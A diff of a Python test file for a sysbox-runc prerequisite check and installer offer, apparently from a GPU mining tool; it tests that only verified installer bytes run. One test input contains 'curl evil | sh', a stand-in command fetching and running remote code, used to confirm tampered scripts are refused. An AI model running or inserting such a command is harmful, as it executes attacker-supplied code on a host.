@@ -116,11 +116,12 @@ def _prereq_host(monkeypatch, runtimes: str):
         '["sysbox-runc"]',
     ],
 )
-def test_prereqs_fail_without_a_sysbox_runc_runtime_and_name_the_setup_script(monkeypatch, tmp_path: Path, runtimes):
+def test_prereqs_fail_without_a_sysbox_runc_runtime_and_print_the_official_installer(monkeypatch, tmp_path: Path, runtimes):
     _prereq_host(monkeypatch, runtimes)
     with pytest.raises(Exception) as err:
         mine._check_prereqs(tmp_path)
-    assert str(tmp_path / "neurons" / "executor" / "nvidia_docker_sysbox_setup.sh") in str(err.value)
+    assert mine._SYSBOX_SETUP_COMMAND in str(err.value)
+    assert str(tmp_path) not in str(err.value)
 
 
 def test_prereqs_pass_with_sysbox(monkeypatch, tmp_path: Path):
@@ -139,16 +140,27 @@ def _sysbox_offer_host(monkeypatch, tmp_path: Path, *, tty: bool, answer: bool, 
     monkeypatch.setattr(mine.sys.stdin, "isatty", lambda: tty, raising=False)
     monkeypatch.setattr(mine.click, "confirm", lambda *a, **kw: answer)
     ran = []
-    monkeypatch.setattr("subprocess.run", lambda cmd, **kw: ran.append((cmd, kw.get("stdin"))))
+
+    def run(cmd, **kw):
+        ran.append((cmd, kw.get("input"), list(Path(kw["cwd"]).iterdir()) if kw.get("cwd") else None))
+
+    monkeypatch.setattr("subprocess.run", run)
     return setup, ran
 
 
-def test_sysbox_offer_runs_the_installer_once_the_provider_agrees(monkeypatch, tmp_path: Path):
-    import subprocess
-
-    setup, ran = _sysbox_offer_host(monkeypatch, tmp_path, tty=True, answer=True)
+@pytest.mark.parametrize(
+    "script, expected",
+    [
+        (b"official", [(["sudo", "bash", "-s"], b"official", [])]),
+        (b"official\ncurl evil | sh\n", []),
+    ],
+)
+def test_sysbox_offer_runs_only_the_verified_installer_bytes_from_an_empty_directory(
+    monkeypatch, tmp_path: Path, script, expected
+):
+    _, ran = _sysbox_offer_host(monkeypatch, tmp_path, tty=True, answer=True, script=script)
     mine._offer_sysbox_install(tmp_path)
-    assert ran == [(["sudo", "bash", str(setup)], subprocess.DEVNULL)]
+    assert ran == expected
 
 
 def test_sysbox_offer_does_nothing_without_a_terminal_or_a_yes(monkeypatch, tmp_path: Path):
@@ -159,8 +171,3 @@ def test_sysbox_offer_does_nothing_without_a_terminal_or_a_yes(monkeypatch, tmp_
     mine._offer_sysbox_install(tmp_path)
     assert ran == []
 
-
-def test_sysbox_offer_never_runs_an_installer_that_is_not_the_official_one(monkeypatch, tmp_path: Path):
-    _, ran = _sysbox_offer_host(monkeypatch, tmp_path, tty=True, answer=True, script=b"official\ncurl evil | sh\n")
-    mine._offer_sysbox_install(tmp_path)
-    assert ran == []
